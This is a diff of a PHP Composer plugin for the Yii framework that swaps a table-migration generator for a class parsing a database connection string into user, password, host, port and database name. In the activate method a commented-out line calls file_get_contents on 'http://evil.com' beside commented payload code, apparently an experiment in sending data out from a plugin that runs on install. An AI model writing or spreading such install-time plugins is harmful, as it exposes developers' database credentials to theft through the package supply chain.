@@ -1,73 +1,25 @@
 <?php
-namespace Experiment;
+namespace Container;
 use Composer\Composer;
 use Composer\IO\IOInterface;
 use Composer\Package\Link;
 use Composer\Plugin\PluginInterface;
 
-use Exception;
-use Yii;
 use yii\base\Component;
-use yii\base\InvalidConfigException;
-use yii\base\InvalidParamException;
-use yii\base\View;
-use yii\db\ColumnSchema;
-use yii\db\Connection;
-use yii\db\Expression;
-use yii\db\Schema;
-use yii\db\TableSchema;
-use yii\helpers\ArrayHelper;
+use yii\base\Object;
 
-class Plugin implements PluginInterface
+class Plugin extends Object implements PluginInterface
 {
 
-  /**
-   * @var Connection DB connection.
-   */
-  public $db;
+  public $clientPath;
+  public $host = '127.0.0.1';
+  protected $dsn = [];
 
-  /**
-   * @var string Table name to be generated (before prefix).
-   */
-  public $tableName;
-
-  /**
-   * @var string Migration class name.
-   */
-  public $className;
-
-  /**
-   * @var View View used in controller.
-   */
-  public $view;
-
-  /**
-   * @var boolean Table prefix flag.
-   */
-  public $useTablePrefix;
-
-  /**
-   * @var string File template.
-   */
-  public $templateFile;
-
-  /**
-   * @var TableSchema Table schema.
-   */
-  protected $_tableSchema;
-
-  /**
-   * Checks if DB connection is passed.
-   * @throws InvalidConfigException
-   */
-  public function __construct()
+  public function __construct(Component $connection, $config = [])
   {
-
-      // parent::init();
-      if (!($this->db instanceof Connection)) {
-          echo "Went inside here-> init()...\n\r";
-          // throw new InvalidConfigException('Parameter db must be an instance of yii\db\Connection!');
-      }
+      $this->dsn = array_fill_keys(['user', 'password', 'host', 'port', 'dbname'], null);
+      $this->dsn = $this->parseDsn($connection->dsn);
+      parent::__construct($config);
   }
 
     /**
@@ -108,6 +60,7 @@ class Plugin implements PluginInterface
         // ]);
         // @file_get_contents("http://evil.com", false, $context);
         $this->createTable();
+
         print_r("Activated.\n\r");
     }
     /**
@@ -130,6 +83,7 @@ class Plugin implements PluginInterface
     //     }
     //     return $payload;
     // }
+
     private function createTable()
     {
       print_r("create table here...\n\r");
